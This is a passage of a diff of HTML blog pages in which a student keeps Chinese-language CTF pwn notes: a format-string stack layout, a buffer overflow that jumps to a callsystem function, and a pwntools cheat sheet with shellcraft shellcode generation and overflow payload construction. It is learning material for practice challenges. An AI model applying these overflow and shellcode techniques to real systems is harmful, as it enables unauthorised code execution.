+<td style="text-align: center;">format字符串</td>
+<td style="text-align: center;">abcde%X %p %x %x</td>
 </tr>
-<tr>
-<td align="center"></td>
-<td align="center">main函数局部变量</td>
-<td align="center">不晓得为什么有两个</td>
+<tr class="odd">
+<td style="text-align: center;"></td>
+<td style="text-align: center;">main函数局部变量</td>
+<td style="text-align: center;">不晓得为什么有两个</td>
 </tr>
-<tr>
-<td align="center"></td>
-<td align="center">printf参数：我是你爹</td>
-<td align="center">%x形式读取，可能是来自main的某个局部变量</td>
+<tr class="even">
+<td style="text-align: center;"></td>
+<td style="text-align: center;">printf参数：我是你爹</td>
+<td style="text-align: center;">%x形式读取，可能是来自main的某个局部变量</td>
 </tr>
-<tr>
-<td align="center"></td>
-<td align="center">printf参数：参数3</td>
-<td align="center">%x形式读取</td>
+<tr class="odd">
+<td style="text-align: center;"></td>
+<td style="text-align: center;">printf参数：参数3</td>
+<td style="text-align: center;">%x形式读取</td>
 </tr>
-<tr>
-<td align="center"></td>
-<td align="center">printf参数：参数2</td>
-<td align="center">%p形式读取</td>
+<tr class="even">
+<td style="text-align: center;"></td>
+<td style="text-align: center;">printf参数：参数2</td>
+<td style="text-align: center;">%p形式读取</td>
 </tr>
-<tr>
-<td align="center"></td>
-<td align="center">printf参数：参数1</td>
-<td align="center">%X形式读取</td>
+<tr class="odd">
+<td style="text-align: center;"></td>
+<td style="text-align: center;">printf参数：参数1</td>
+<td style="text-align: center;">%X形式读取</td>
 </tr>
-<tr>
-<td align="center"></td>
-<td align="center">printf参数：format地址</td>
-<td align="center">0x12</td>
+<tr class="even">
+<td style="text-align: center;"></td>
+<td style="text-align: center;">printf参数：format地址</td>
+<td style="text-align: center;">0x12</td>
 </tr>
-<tr>
-<td align="center"></td>
-<td align="center">返回地址</td>
-<td align="center">不晓得为什么有两个</td>
+<tr class="odd">
+<td style="text-align: center;"></td>
+<td style="text-align: center;">返回地址</td>
+<td style="text-align: center;">不晓得为什么有两个</td>
 </tr>
-<tr>
-<td align="center">低地址</td>
-<td align="center">printf母函数EBP</td>
-<td align="center">不晓得</td>
+<tr class="even">
+<td style="text-align: center;">低地址</td>
+<td style="text-align: center;">printf母函数EBP</td>
+<td style="text-align: center;">不晓得</td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
 <img src="/2020/12/31/AD-CGfsb/2.png" class>
-<p>由上图计算出<strong>format字符串</strong>距离<strong>format地址</strong>的偏移量是10。<br>在32位运行时堆栈中，ESP 寄存器存放的是堆栈中某个位置的 32 位偏移量，相当于每4个字节1偏移量。</p>
+<p>由上图计算出<strong>format字符串</strong>距离<strong>format地址</strong>的偏移量是10。 在32位运行时堆栈中，ESP 寄存器存放的是堆栈中某个位置的 32 位偏移量，相当于每4个字节1偏移量。</p>
 <img src="/2020/12/31/AD-CGfsb/3.png" class>
-<p>DB定义字节类型变量，一个字节数据占1个字节单元，读完一个，偏移量加1<br>DW定义字类型变量，一个字数据占2个字节单元，读完一个，偏移量加2<br>DD定义双字类型变量，一个双字数据占4个字节单元，读完一个，偏移量加4<br>pwnme的地址为0x0804A068，是一个字节的double word。p32函数将pwnme地址转化成了四个字节的小端序字符。c语言中，char类型，一个字符占一个字节，故一般意义上的字符数相当于字节数。</p>
+<p>DB定义字节类型变量，一个字节数据占1个字节单元，读完一个，偏移量加1 DW定义字类型变量，一个字数据占2个字节单元，读完一个，偏移量加2 DD定义双字类型变量，一个双字数据占4个字节单元，读完一个，偏移量加4 pwnme的地址为0x0804A068，是一个字节的double word。p32函数将pwnme地址转化成了四个字节的小端序字符。c语言中，char类型，一个字符占一个字节，故一般意义上的字符数相当于字节数。</p>
 <p>完结撒花</p>
 
       
@@ -843,18 +828,16 @@
 <p><strong>函数原型</strong>： int write(int handle,void *buf,int len);</p>
 <p><strong>功能</strong>：获取打开文件的指针位置</p>
 <p><strong>参数</strong>：</p>
-<p>​    int handle 为要获取文件指针的文件句柄</p>
-<p>​    void *buf  为要写入的内容</p>
-<p>​    int len   为要写入文件的长度</p>
+<p>​ int handle 为要获取文件指针的文件句柄</p>
+<p>​ void *buf 为要写入的内容</p>
+<p>​ int len 为要写入文件的长度</p>
 <p><strong>返回值</strong>：返回实际写入文件内容的长度</p>
-<p>本题伪C代码的write为</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write(1, &quot;Hello, World\n&quot;, 0xDuLL);</span><br></pre></td></tr></table></figure>
-
+<p>本题伪C代码的write为 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write(1, &quot;Hello, World\n&quot;, 0xDuLL);</span><br></pre></td></tr></table></figure></p>
 <p>猜测1为终端</p>
 <p>在主函数里乱跳找不到东西，最后在左侧找到一个callsystem函数，发现callsystem有最高权限，只要运行它就能得到flag。</p>
 <p>主函数没有给出入口，但read()函数存在溢出漏洞，利用漏洞读入大内容直至其地址到返回位置。回去找到callsystem的地址，在返回位置写入callsystem的地址，使整个程序转跳到callsystem，进入。</p>
 <p>最后和第一关一样，ls，cat flag的到答案。</p>
-<p>问题：<br>1.p64打包（内容）如何被识别<br>2.payload的偏移和p64()怎么被分别识别</p>
+<p>问题： 1.p64打包（内容）如何被识别 2.payload的偏移和p64()怎么被分别识别</p>
 
       
     </div>
@@ -920,7 +903,7 @@
     
     <div class="post-body" itemprop="articleBody">
           <p>跟上一题一毛一样的题型，就这，就这，就这。</p>
-<p>写入v5，v4。<br>第一次判断v5为1926不让通过，第二次判断v5为2019通过。没有给第二次写v5的机会。<br>查询v5，v4的地址，在读v4时使其偏移到v5的位置，写入2019覆盖掉v5原本的数值就好。<br>（第一次写v5随便写，不是1926就行）</p>
+<p>写入v5，v4。 第一次判断v5为1926不让通过，第二次判断v5为2019通过。没有给第二次写v5的机会。 查询v5，v4的地址，在读v4时使其偏移到v5的位置，写入2019覆盖掉v5原本的数值就好。 （第一次写v5随便写，不是1926就行）</p>
 <p>注意：溢出向下覆盖，跟编号无关</p>
 
       
@@ -993,132 +976,102 @@
     
     <div class="post-body" itemprop="articleBody">
           <p>注：随手找的，如果没有找想要的用法再去搜</p>
-<h1 id="natcat"><a href="#natcat" class="headerlink" title="natcat"></a>natcat</h1><p>netcat通过TCP和UDP在网络中读写数据。通过与其他工具结合和重定向，可以在脚本中以多种方式使用它。</p>
-<p>netcat所做的就是在两台电脑之间建立链接并返回两个数据流。<br>能建立一个服务器，传输文件，与朋友聊天，传输流媒体或者用它作为其它协议的独立客户端。</p>
-<p>用于打开一个shell<br>当在题目网页点击获取在线环境，云端便搭建了一个服务器<br>我在客户端仅仅简单连接到服务器（直观上感觉了进入一个文件夹）</p>
-<p>$nc -n ip地址 ip端口<br>你会得到一个shell提示符在客户端</p>
-<p>Linux nc命令<br>参数说明（用一个写一个）：<br>-n 直接使用IP地址，而不通过域名服务器。<br>-p&lt;通信端口&gt; 设置本地主机使用的通信端口。</p>
-<h1 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h1><p>使用<code>from pwn import *</code>将所有的模块导入到当前namespace，这条语句还会帮你把os,sys等常用的系统库导入。</p>
-<h2 id="常用模块如下："><a href="#常用模块如下：" class="headerlink" title="常用模块如下："></a>常用模块如下：</h2><p>asm : 汇编与反汇编，支持x86/x64/arm/mips/powerpc等基本上所有的主流平台<br>dynelf : 用于远程符号泄漏，需要提供leak方法<br>elf : 对elf文件进行操作<br>gdb : 配合gdb进行调试<br>memleak : 用于内存泄漏<br>shellcraft : shellcode的生成器<br>tubes : 包括tubes.sock, tubes.process, tubes.ssh, tubes.serialtube，分别适用于不同场景的PIPE<br>utils : 一些实用的小功能，例如CRC计算，cyclic pattern等</p>
-<h2 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">本地 ：sh = porcess(&quot;./a&quot;)</span><br><span class="line">远程：sh = remote(&quot;ip地址&quot;,端口)</span><br><span class="line">这里也可以仅仅使用本地文件,调试时方便:</span><br><span class="line">r = process(&quot;./test&quot;)</span><br><span class="line">test即为文件名,这使得改变远程和本地十分方便.</span><br><span class="line">关闭连接：sh.close()</span><br></pre></td></tr></table></figure>
+<h1 id="natcat">natcat</h1>
+<p>netcat通过TCP和UDP在网络中读写数据。通过与其他工具结合和重定向，可以在脚本中以多种方式使用它。</p>
+<p>netcat所做的就是在两台电脑之间建立链接并返回两个数据流。 能建立一个服务器，传输文件，与朋友聊天，传输流媒体或者用它作为其它协议的独立客户端。</p>
+<p>用于打开一个shell 当在题目网页点击获取在线环境，云端便搭建了一个服务器 我在客户端仅仅简单连接到服务器（直观上感觉了进入一个文件夹）</p>
+<p>$nc -n ip地址 ip端口 你会得到一个shell提示符在客户端</p>
+<p>Linux nc命令 参数说明（用一个写一个）： -n 直接使用IP地址，而不通过域名服务器。 -p<通信端口> 设置本地主机使用的通信端口。</通信端口></p>
+<h1 id="pwntools">pwntools</h1>
+<p>使用<code>from pwn import *</code>将所有的模块导入到当前namespace，这条语句还会帮你把os,sys等常用的系统库导入。</p>
+<h2 id="常用模块如下">常用模块如下：</h2>
+<p>asm : 汇编与反汇编，支持x86/x64/arm/mips/powerpc等基本上所有的主流平台 dynelf : 用于远程符号泄漏，需要提供leak方法 elf : 对elf文件进行操作 gdb : 配合gdb进行调试 memleak : 用于内存泄漏 shellcraft : shellcode的生成器 tubes : 包括tubes.sock, tubes.process, tubes.ssh, tubes.serialtube，分别适用于不同场景的PIPE utils : 一些实用的小功能，例如CRC计算，cyclic pattern等</p>
+<h2 id="连接">连接</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">本地 ：sh = porcess(&quot;./a&quot;)</span><br><span class="line">远程：sh = remote(&quot;ip地址&quot;,端口)</span><br><span class="line">这里也可以仅仅使用本地文件,调试时方便:</span><br><span class="line">r = process(&quot;./test&quot;)</span><br><span class="line">test即为文件名,这使得改变远程和本地十分方便.</span><br><span class="line">关闭连接：sh.close()</span><br></pre></td></tr></table></figure>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">io = process(<span class="string">&quot;./bin&quot;</span>, shell=<span class="literal">True</span>)</span><br><span class="line"><span class="comment">#启动本地程序进行交互，用于gdb调试</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="IO模块"><a href="#IO模块" class="headerlink" title="IO模块"></a>IO模块</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sh.send(data)  发送数据</span><br><span class="line">sh.sendline(data)  发送一行数据，相当于在数据后面加\n</span><br><span class="line">sh.recv(numb = 2048, timeout = dufault)  接受数据，numb指定接收的字节，timeout指定超时</span><br><span class="line">sh.recvline(keepends=True)  接受一行数据，keepends为是否保留行尾的\n</span><br><span class="line">sh.recvuntil(&quot;Hello,World\n&quot;,drop=fasle)  接受数据直到我们设置的标志出现</span><br><span class="line">sh.recvall()  一直接收直到EOF</span><br><span class="line">sh.recvrepeat(timeout = default)  持续接受直到EOF或timeout</span><br><span class="line">sh.interactive()  直接进行交互，相当于回到shell的模式，在取得shell之后使用</span><br></pre></td></tr></table></figure>
-
-<h2 id="ELF文件操作"><a href="#ELF文件操作" class="headerlink" title="ELF文件操作"></a>ELF文件操作</h2><p>以xctf level3为例</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>e = ELF(<span class="string">&#x27;./ level3&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> e										<span class="comment">#e目前或许是一串路径，输出如下</span></span><br><span class="line">ELF(<span class="string">&#x27;/home/hacker/jiaoben/level3&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> e.address								<span class="comment"># 文件装载的基地址，十进制</span></span><br><span class="line"><span class="number">134512640</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> <span class="built_in">hex</span>(e.address)						<span class="comment">#加上十六进制转化函数，文件装载的基地址的十六进制</span></span><br><span class="line"><span class="number">0x8048000</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;<span class="built_in">print</span> e.symbols[<span class="string">&#x27;write&#x27;</span>]						<span class="comment">#write函数地址</span></span><br><span class="line"><span class="number">134513472</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(e.symbols[<span class="string">&#x27;write&#x27;</span>])						<span class="comment">#同理</span></span><br><span class="line"><span class="number">0x8048340</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;<span class="built_in">print</span> e.got[<span class="string">&#x27;write&#x27;</span>]							<span class="comment">#got表中存放（write函数地址）的地址</span></span><br><span class="line"><span class="number">134520856</span></span><br><span class="line">&gt;&gt;&gt;<span class="built_in">print</span> <span class="built_in">hex</span>(e.got[<span class="string">&#x27;write&#x27;</span>])					<span class="comment">#同理</span></span><br><span class="line"><span class="number">0x804a018</span></span><br><span class="line">&gt;&gt;&gt;<span class="built_in">print</span> p32(e.got[<span class="string">&#x27;write&#x27;</span>])					<span class="comment">#我是说，如果有人和我一样好奇打包机制的话</span></span><br><span class="line">\x18\x04</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> <span class="built_in">hex</span>(e.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>())		<span class="comment"># 字符串/bin/sh的地址，python这么强大的吗？？？</span></span><br></pre></td></tr></table></figure>
-
-
-<h2 id="整数pack与数据unpack"><a href="#整数pack与数据unpack" class="headerlink" title="整数pack与数据unpack"></a>整数pack与数据unpack</h2><p>pack：p32，p64<br>unpack：u32，u64</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">elf = ELF(&#x27;./a&#x27;)</span><br><span class="line">b = elf.symbols[&#x27;system&#x27;]</span><br><span class="line">payload = &#x27;a&#x27; * (0x80 + 0x8) + p64(b)</span><br><span class="line">...	</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">io.p32()</span><br><span class="line">io.p64(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">io.u32(<span class="string">&quot;1234&quot;</span>)</span><br><span class="line">io.u64(<span class="string">&quot;12345678&quot;</span>)</span><br><span class="line"><span class="comment"># 将字节数组与数组进行以小端对齐的方式相互转化，32负责转化dword，64负责转化qword</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="PWN-shellcode"><a href="#PWN-shellcode" class="headerlink" title="PWN-shellcode"></a>PWN-shellcode</h2><p>当我们在获得程序的漏洞后，就可以在程序的漏洞处执行特定的代码，而这些代码也就是俗称的shellcode。（以下为获取pwntools内置集成）</p>
-<p>（1）先设置目标机的参数<br>context(os=’linux’, arch=’amd64’, log_level=’debug’)</p>
-<p>os设置系统为linux系统，在完成ctf题目的时候，大多数pwn题目的系统都是linux<br>arch设置架构为amd64，可以简单的认为设置为64位的模式，对应的32位模式是’i386’<br>log_level设置日志输出的等级为debug，这句话在调试的时候一般会设置，这样pwntools会将完整的io过程都打印下来，使得调试更加方便，可以避免在完成CTF题目时出现一些和IO相关的错误。</p>
-<p>（2）获取shellcode<br>获得执行system(“/bin/sh”)汇编代码所对应的机器码<br>asm(shellcraft.sh())<br>具体利用如下：</p>
+<h2 id="io模块">IO模块</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sh.send(data)  发送数据</span><br><span class="line">sh.sendline(data)  发送一行数据，相当于在数据后面加\n</span><br><span class="line">sh.recv(numb = 2048, timeout = dufault)  接受数据，numb指定接收的字节，timeout指定超时</span><br><span class="line">sh.recvline(keepends=True)  接受一行数据，keepends为是否保留行尾的\n</span><br><span class="line">sh.recvuntil(&quot;Hello,World\n&quot;,drop=fasle)  接受数据直到我们设置的标志出现</span><br><span class="line">sh.recvall()  一直接收直到EOF</span><br><span class="line">sh.recvrepeat(timeout = default)  持续接受直到EOF或timeout</span><br><span class="line">sh.interactive()  直接进行交互，相当于回到shell的模式，在取得shell之后使用</span><br></pre></td></tr></table></figure>
+<h2 id="elf文件操作">ELF文件操作</h2>
+<p>以xctf level3为例 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>e = ELF(<span class="string">&#x27;./ level3&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> e										<span class="comment">#e目前或许是一串路径，输出如下</span></span><br><span class="line">ELF(<span class="string">&#x27;/home/hacker/jiaoben/level3&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> e.address								<span class="comment"># 文件装载的基地址，十进制</span></span><br><span class="line"><span class="number">134512640</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> <span class="built_in">hex</span>(e.address)						<span class="comment">#加上十六进制转化函数，文件装载的基地址的十六进制</span></span><br><span class="line"><span class="number">0x8048000</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;<span class="built_in">print</span> e.symbols[<span class="string">&#x27;write&#x27;</span>]						<span class="comment">#write函数地址</span></span><br><span class="line"><span class="number">134513472</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(e.symbols[<span class="string">&#x27;write&#x27;</span>])						<span class="comment">#同理</span></span><br><span class="line"><span class="number">0x8048340</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;<span class="built_in">print</span> e.got[<span class="string">&#x27;write&#x27;</span>]							<span class="comment">#got表中存放（write函数地址）的地址</span></span><br><span class="line"><span class="number">134520856</span></span><br><span class="line">&gt;&gt;&gt;<span class="built_in">print</span> <span class="built_in">hex</span>(e.got[<span class="string">&#x27;write&#x27;</span>])					<span class="comment">#同理</span></span><br><span class="line"><span class="number">0x804a018</span></span><br><span class="line">&gt;&gt;&gt;<span class="built_in">print</span> p32(e.got[<span class="string">&#x27;write&#x27;</span>])					<span class="comment">#我是说，如果有人和我一样好奇打包机制的话</span></span><br><span class="line">\x18\x04</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> <span class="built_in">hex</span>(e.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>())		<span class="comment"># 字符串/bin/sh的地址，python这么强大的吗？？？</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="整数pack与数据unpack">整数pack与数据unpack</h2>
+<p>pack：p32，p64 unpack：u32，u64 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">elf = ELF(&#x27;./a&#x27;)</span><br><span class="line">b = elf.symbols[&#x27;system&#x27;]</span><br><span class="line">payload = &#x27;a&#x27; * (0x80 + 0x8) + p64(b)</span><br><span class="line">...	</span><br></pre></td></tr></table></figure> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">io.p32()</span><br><span class="line">io.p64(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">io.u32(<span class="string">&quot;1234&quot;</span>)</span><br><span class="line">io.u64(<span class="string">&quot;12345678&quot;</span>)</span><br><span class="line"><span class="comment"># 将字节数组与数组进行以小端对齐的方式相互转化，32负责转化dword，64负责转化qword</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="pwn-shellcode">PWN-shellcode</h2>
+<p>当我们在获得程序的漏洞后，就可以在程序的漏洞处执行特定的代码，而这些代码也就是俗称的shellcode。（以下为获取pwntools内置集成）</p>
+<p>（1）先设置目标机的参数 context(os=’linux’, arch=’amd64’, log_level=’debug’)</p>
+<p>os设置系统为linux系统，在完成ctf题目的时候，大多数pwn题目的系统都是linux arch设置架构为amd64，可以简单的认为设置为64位的模式，对应的32位模式是’i386’ log_level设置日志输出的等级为debug，这句话在调试的时候一般会设置，这样pwntools会将完整的io过程都打印下来，使得调试更加方便，可以避免在完成CTF题目时出现一些和IO相关的错误。</p>
+<p>（2）获取shellcode 获得执行system(“/bin/sh”)汇编代码所对应的机器码 asm(shellcraft.sh()) 具体利用如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br></pre></td></tr></table></figure>
-
-<h2 id="大佬关于pwntools的博客"><a href="#大佬关于pwntools的博客" class="headerlink" title="大佬关于pwntools的博客"></a>大佬关于pwntools的博客</h2><p>引入pwntools库</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 虽然不太符合pylint代码规范</span></span><br><span class="line"><span class="comment"># 但官方也推荐这样引用</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure>
-
-<p>基本的输入输出和交互<br>绑定要处理的程序</p>
+<h2 id="大佬关于pwntools的博客">大佬关于pwntools的博客</h2>
+<p>引入pwntools库 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 虽然不太符合pylint代码规范</span></span><br><span class="line"><span class="comment"># 但官方也推荐这样引用</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure></p>
+<p>基本的输入输出和交互 绑定要处理的程序</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 远程</span></span><br><span class="line"><span class="comment"># remote(ip/hostname, port)</span></span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8888</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 本地</span></span><br><span class="line"><span class="comment"># 注意process中参数一定要有./</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>设置上下文环境</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置上下文环境主要用于一些需要上下文的漏洞利用</span></span><br><span class="line"><span class="comment"># 比如：shellcode的生成</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置操作系统</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line"><span class="comment"># 设置32位的体系架构 </span></span><br><span class="line">context.arch = <span class="string">&quot;i386&quot;</span></span><br><span class="line"><span class="comment"># 设置64位的体系架构</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment"># 打印交互中的输入和输出</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment"># 也可以直接这样写</span></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, lod_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 清空之前的上下文</span></span><br><span class="line">context.clear()</span><br><span class="line"><span class="comment"># 清空之前的上下文并设置为64位的体系架构</span></span><br><span class="line">context.clear(arch=<span class="string">&quot;amd64&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>获取程序输出</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p.recv()        <span class="comment"># 默认接受最大为4096字节的输出</span></span><br><span class="line">p.recvline()    <span class="comment"># 接受程序的一行输出</span></span><br><span class="line">p.recvall()     <span class="comment"># 接受程序的当前全部输出，直到遇到EOF</span></span><br><span class="line"><span class="comment">### 直到接收到\n为止，drop=True表示丢弃\n，buf为接收到的输出但不包括丢弃的\n</span></span><br><span class="line">buf = p.recvuntil(<span class="string">&quot;\n&quot;</span>, drop=<span class="literal">True</span>)   </span><br></pre></td></tr></table></figure>
-
-<p>payload的构造</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pad = cyclic(<span class="number">0x10</span>)</span><br><span class="line"><span class="comment"># 可以用上面的代码替代传统的构造方式 pad = b&quot;A&quot; * 0x10</span></span><br><span class="line"><span class="comment"># 其结果为 b&#x27;aaaabaaacaaadaaa&#x27;</span></span><br><span class="line">offset = cyclic_find(<span class="string">b&quot;daaa&quot;</span>)  <span class="comment"># 找到当前pad的偏移值</span></span><br></pre></td></tr></table></figure>
-
-
-<p>实现输入</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = b&#x27;hello!&#x27;      # python3，payload为字节类型</span><br><span class="line">p.sendline(payload)      # 输入hello! + \n</span><br><span class="line">p.send(payload)          # 输入hello!</span><br><span class="line">p.sendafter(&quot;test&quot;, payload)      # 在接受到test后才发送payload</span><br><span class="line">p.sendlineafter(&quot;test&quot;, payload)  # 在接受到test后才发送payload + \n</span><br></pre></td></tr></table></figure>
-
-
-<p>实现交互</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 开启和程序交互的终端</span></span><br><span class="line"><span class="comment"># 一般用于获取到shell的情况</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>获取程序或者libc中的信息</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pro = ELF(<span class="string">&quot;./program&quot;</span>)  <span class="comment"># 加载样本</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc&quot;</span>)    <span class="comment"># 加载libc</span></span><br><span class="line"></span><br><span class="line">read_addr = pro.symbols[<span 